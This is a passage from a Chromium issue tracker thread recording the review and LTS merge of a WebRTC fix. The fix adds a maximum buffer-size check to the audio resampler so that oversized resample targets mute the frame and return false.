    Reviewed-by: Per Åhgren <peah@webrtc.org> 
    Reviewed-by: Henrik Lundin <henrik.lundin@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47076} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/458263 
    Cr-Commit-Position: refs/branch-heads/7204@{#2} 
    Cr-Branched-From: e4445e46a910eb407571ec0b0b8b7043562678cf-refs/heads/main@{#44764}

```

---

Files:

- M `modules/audio_coding/BUILD.gn`
- M `modules/audio_coding/DEPS`
- M `modules/audio_coding/acm2/acm_resampler.cc`

---

Hash: 4d6452ebc9e96bac7a0691f088147c9f174e60fa  

Date: Fri Mar 20 09:33:39 2026


---

### pe...@google.com (2026-04-10)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-04-10)

1. https://webrtc-review.git.corp.google.com/c/src/+/458262
2. Low - There was no conflict. But the cherry-picked CL failed on the trybots, but it looks like the trybot didn't support the M144 branch. 
3. 146.
4. Yes. the bug was introduced in 2024.

### an...@google.com (2026-04-10)

Merge approved for LTS-144.

### dx...@google.com (2026-04-17)

Project: src  

Branch:  refs/branch-heads/7559  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/458262>

[M144] Check maximum buffer size in ResamplerHelper::MaybeResample

---


Expand for full commit details
```
     
    Verify that the target sample count does not exceed the maximum allowed 
    size for an AudioFrame. Previously, requesting a resample operation with 
    a high number of channels or a high sample rate could result in a target 
    data size that exceeded the internal limits of the AudioFrame class. 
     
    This change adds a validation check before starting the resampling 
    process. If the calculated target size—based on the desired sample rate 
    and channel count—surpasses kMaxDataSizeSamples, the operation now 
    safely aborts. In such cases, the error is logged, the audio frame is 
    muted to avoid undefined behavior, and the function returns false. 
     
    (cherry picked from commit ecde302f3f4e4f4149ad7eda697bb9309955e57d) 
     
    No-try: true 
    Bug: chromium:486349161 
    Fixes: chromium:486349161 
    Change-Id: Ia0d8abcd390f90a590c07c0606f9b6c968f663e6 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/454000 
    Reviewed-by: Per Åhgren <peah@webrtc.org> 
    Reviewed-by: Henrik Lundin <henrik.lundin@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47076} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/458262 
    Cr-Commit-Position: refs/branch-heads/7559@{#4} 
    Cr-Branched-From: f680c1893f3b166b370439da52ae82d02f54969c-refs/heads/main@{#46356}

```

---

Files:

- M `modules/audio_coding/BUILD.gn`
- M `modules/audio_coding/DEPS`
- M `modules/audio_coding/acm2/acm_resampler.cc`
- A `modules/audio_coding/acm2/acm_resampler_unittest.cc`

---

Hash: 1476f2eaaea52647febfbbd2d76eea0ee608345d  

Date: Fri Mar 6 08:37:17 2026


---

### ch...@google.com (2026-06-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/486349161)*
